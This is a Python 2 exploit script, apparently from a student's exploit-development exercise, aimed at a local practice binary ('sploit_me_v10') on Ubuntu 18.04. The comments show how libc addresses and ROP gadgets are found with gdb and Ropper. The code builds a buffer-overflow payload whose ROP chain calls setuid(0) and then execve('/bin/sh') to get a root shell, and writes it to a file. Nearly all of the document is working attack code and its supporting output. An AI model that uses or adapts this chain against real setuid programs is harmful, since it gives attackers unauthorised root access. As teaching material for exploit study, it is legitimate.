#!/usr/bin/env python2

# Code by Robin Larsson
# rl22ct@student.lnu.se
# robin.larsson@protonmail.ch
# 2019-11-27

# Tested and developed on the following versions.
#
# Ubuntu version:
# root@ubuntu:~# cat /etc/issue
# Ubuntu 18.04.3 LTS \n \l
#
# Kernel:
# root@ubuntu:~# uname -a
# Linux ubuntu 5.0.0-32-generic #34~18.04.2-Ubuntu SMP Thu Oct 10 10:36:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
#
# Libc version:
# root@ubuntu:~# ldd --version
# ldd (Ubuntu GLIBC 2.27-3ubuntu1) 2.27
#
# GCC version:
# root@ubuntu:~# gcc --version
# gcc (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0

# Register setup for execve syscall number 59 to execute /bin/sh.
# rax -> 59 -> 0x3b
# rdi -> /bin/sh
# rdx -> 0x0
# rsi -> 0x0

# Register setup for setuid(0).
# rdi -> 0x0

# Getting the ROP gadgets with Ropper.
# ./Ropper.py --file /lib/x86_64-linux-gnu/libc.so.6 --chain "execve cmd=/bin/sh"

# Find string /bin/sh in process with gdb. Attach to target program.
# (gdb) info proc map
# process 6305
# Mapped address spaces:
#
#          Start Addr           End Addr       Size     Offset objfile
#      0x555555554000     0x555555555000     0x1000        0x0 /home/user01/exploitdev_ubu1804_64bit/sploit_me_v10
#      0x555555754000     0x555555755000     0x1000        0x0 /home/user01/exploitdev_ubu1804_64bit/sploit_me_v10
#      0x555555755000     0x555555756000     0x1000     0x1000 /home/user01/exploitdev_ubu1804_64bit/sploit_me_v10
#      0x555555756000     0x555555777000    0x21000        0x0 [heap]
#      0x7ffff79e4000     0x7ffff7bcb000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
#      0x7ffff7bcb000     0x7ffff7dcb000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
#      0x7ffff7dcb000     0x7ffff7dcf000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
#      0x7ffff7dcf000     0x7ffff7dd1000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
#      0x7ffff7dd1000     0x7ffff7dd5000     0x4000        0x0
#      0x7ffff7dd5000     0x7ffff7dfc000    0x27000        0x0 /lib/x86_64-linux-gnu/ld-2.27.so
#      0x7ffff7fe0000     0x7ffff7fe2000     0x2000        0x0
#      0x7ffff7ff8000     0x7ffff7ffb000     0x3000        0x0 [vvar]
#      0x7ffff7ffb000     0x7ffff7ffc000     0x1000        0x0 [vdso]
#      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x27000 /lib/x86_64-linux-gnu/ld-2.27.so
#      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x28000 /lib/x86_64-linux-gnu/ld-2.27.so
#      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0
#      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
#  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
#
# (gdb) find 0x7ffff79e4000,0x7ffff7bcb000 "/bin/sh"
# A syntax error in expression, near `"/bin/sh"'.
# (gdb) find 0x7ffff79e4000,0x7ffff7bcb000,"/bin/sh"
# 0x7ffff7b97e9a
# 1 pattern found.
#
# (gdb) x/s 0x7ffff7b97e9a
# 0x7ffff7b97e9a:	"/bin/sh"

# Memory address to string /bin/sh in little endian.
bin_sh ="\x9a\x7e\xb9\xf7\xff\x7f\x00\x00"

# Get memory address to setuid(), attach with gdb to target process.
# (gdb) print setuid
# $3 = {int (uid_t)} 0x7ffff7ac9970 <__setuid>

# Memory address to setuid in little endian.
setuid = "\x70\x99\xac\xf7\xff\x7f\x00\x00"

from struct import pack

# Convert 64-bit addresses to little endian.
p = lambda x : pack("<Q",x)

# Address in memory to gadget: pop rax, ret
# From Ropper: rop += rebase_0(0x00000000000439c8) # 0x00000000000439c8: pop rax; ret;
pop_rax_ret = "\xc8\x79\xa2\xf7\xff\x7f\x00\x00"

# Address in memory to gadget: pop rdi, ret
# From Ropper:  rop += rebase_0(0x000000000002155f) # 0x000000000002155f: pop rdi; ret;
pop_rdi_ret = "\x5f\x55\xa0\xf7\xff\x7f\x00\x00"

# Address in memory to gadget: pop rdx, ret
# From Ropper:  rop += rebase_0(0x0000000000001b96) # 0x0000000000001b96: pop rdx; ret;
pop_rdx_ret = "\x96\x5b\x9e\xf7\xff\x7f\x00\x00"

# Address in memory to gadget: pop rsi, ret
# From Ropper:  rop += rebase_0(0x0000000000023e6a) # 0x0000000000023e6a: pop rsi; ret;
pop_rsi_ret = "\x6a\x7e\xa0\xf7\xff\x7f\x00\x00"

# Address in memory to gadget: syscall, ret
# From Ropper:  rop += rebase_0(0x00000000000d2975) # 0x00000000000d2975: syscall; ret;
syscall = "\x75\x69\xab\xf7\xff\x7f\x00\x00"

# 59 = 0x3b
fivenine = "\x3b\x00\x00\x00\x00\x00\x00\x00"

# 0 = 0x0
zero = "\x00\x00\x00\x00\x00\x00\x00\x00"

# Location of file where data is written.
file_location = "exploit_sploit_me01.txt"

# Data that will be written to file_location.
data = "\x41"*128 + "\x43"*8 + pop_rdi_ret + zero + setuid + pop_rax_ret + fivenine + pop_rdi_ret + bin_sh + pop_rdx_ret + zero + pop_rsi_ret + zero + syscall

# Write data to file_location.
f = open(file_location, "w")
f.write(data)
f.close()
